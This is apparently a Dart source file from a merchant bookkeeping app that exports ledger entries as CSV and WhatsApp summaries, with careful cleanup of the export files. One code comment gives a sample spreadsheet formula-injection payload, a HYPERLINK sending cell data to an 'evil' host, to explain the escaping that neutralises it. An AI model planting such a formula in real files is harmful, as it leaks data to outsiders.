import 'dart:io';

import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';

import '../../core/format/dates.dart';
import '../../core/format/money.dart';
import '../../domain/models/ledger_entry.dart';
import '../../domain/models/ledger_kind.dart';
import '../../domain/services/ledger_math.dart';

/// CSV and WhatsApp exports.
///
/// Both are built from the same ledger rows the screens read, so an exported
/// file always reconciles with what the merchant saw.
abstract final class LedgerExport {
  static const _headers = [
    'fecha',
    'hora',
    'canal',
    'monto',
    'cuenta_como_venta',
    'nota',
    'cliente',
    'origen',
    'estado',
  ];

  static String toCsv(List<LedgerEntry> entries) {
    final buffer = StringBuffer()..writeln(_headers.join(','));
    for (final e in entries) {
      buffer.writeln([
        Dates.iso(e.occurredAt),
        Dates.time(e.occurredAt),
        e.kind.label,
        Money.bare(e.amountCents),
        // Spelled out so the file is self-explanatory: a fiado issued is money
        // lent, and does not belong in a revenue column.
        e.countsAsIncome ? 'si' : 'no',
        e.note ?? '',
        e.customerName ?? '',
        e.source.badge ?? 'manual',
        if (e.isVoided)
          'anulado: ${e.voidedReason ?? 'sin motivo'}'
        else if (e.supersededByCloseout)
          'reemplazado por cierre del dia'
        else
          'activo',
      ].map(_escape).join(','));
    }
    return buffer.toString();
  }

  /// Characters that make a spreadsheet treat a cell as a formula rather than
  /// as text.
  static const _formulaTriggers = {'=', '+', '-', '@', '\t', '\r'};

  static String _escape(String value) {
    var text = value;

    // Two of these columns are free text the merchant typed from what a
    // customer told them, and the finished file is meant to be shared over
    // WhatsApp. A name like `=HYPERLINK("https://evil/?d="&A1,"María")` is
    // inert in this app and becomes a live formula the moment the accountant
    // opens the file. A leading apostrophe pins the cell to text in Excel,
    // Calc and Sheets alike.
    //
    // Applied to every column, not just the two that need it today, so the
    // guarantee does not depend on remembering this when a column is added.
    if (text.isNotEmpty && _formulaTriggers.contains(text[0])) {
      text = "'$text";
    }

    if (text.contains(',') || text.contains('"') || text.contains('\n')) {
      return '"${text.replaceAll('"', '""')}"';
    }
    return text;
  }

  /// Plain text that renders cleanly in a WhatsApp message — no tables, no
  /// markdown, just aligned lines.
  static String toSummary(List<LedgerEntry> entries, {required String title}) {
    final days = LedgerMath.groupByDay(entries);
    final overall = LedgerMath.totals(entries);
    final buffer = StringBuffer()
      ..writeln(title)
      ..writeln('');

    for (final day in days.take(31)) {
      buffer.writeln('${Dates.dayHeader(day.day)}: ${Money.format(day.totals.totalCents)}');
    }

    buffer
      ..writeln('')
      ..writeln('TOTAL: ${Money.format(overall.totalCents)}')
      ..writeln('  QR: ${Money.format(overall.qrCents)}')
      ..writeln('  Tarjeta: ${Money.format(overall.cardCents)}')
      ..writeln('  Efectivo: ${Money.format(overall.cashCents)}')
      ..writeln('  Cobros fiado: ${Money.format(overall.fiadoCollectedCents)}');

    if (overall.fiadoIssuedCents > 0) {
      buffer.writeln('');
      buffer.writeln(
          'Fiado dado (no cuenta como venta): ${Money.format(overall.fiadoIssuedCents)}');
    }
    return buffer.toString();
  }

  /// Writes the CSV to a private file and hands it to the system share sheet.
  static Future<void> shareCsv(List<LedgerEntry> entries, {String name = 'libreta'}) async {
    final file = await _writeExport(
      '$name-${Dates.iso(DateTime.now())}.csv',
      toCsv(entries),
    );
    await SharePlus.instance.share(
      ShareParams(files: [XFile(file.path)], subject: 'Historial de ventas'),
    );
  }

  static Future<void> shareSummary(List<LedgerEntry> entries, {required String title}) {
    return SharePlus.instance.share(ShareParams(text: toSummary(entries, title: title)));
  }

  /// An exported CSV is a plaintext copy of the merchant's entire ledger —
  /// every customer, phone number and debt — sitting outside the database.
  ///
  /// The file cannot be deleted immediately after sharing, because the app
  /// receiving it may still be reading. So exports live in one directory of
  /// their own, and it is emptied before each write: at most one export ever
  /// exists, and [clearCache] can remove even that.
  static Future<File> _writeExport(String filename, String contents) async {
    final directory = await _exportDirectory();
    if (directory.existsSync()) {
      await directory.delete(recursive: true);
    }
    await directory.create(recursive: true);

    final file = File('${directory.path}/$filename');
    await file.writeAsString(contents, flush: true);
    return file;
  }

  /// Removes any export left on disk. Called when the merchant erases their
  /// data, so "borrar todos mis datos" does not leave a full copy behind.
  static Future<void> clearCache() async {
    final directory = await _exportDirectory();
    if (directory.existsSync()) {
      await directory.delete(recursive: true);
    }
  }

  static Future<Directory> _exportDirectory() async {
    final root = await getTemporaryDirectory();
    return Directory('${root.path}/exports');
  }
}
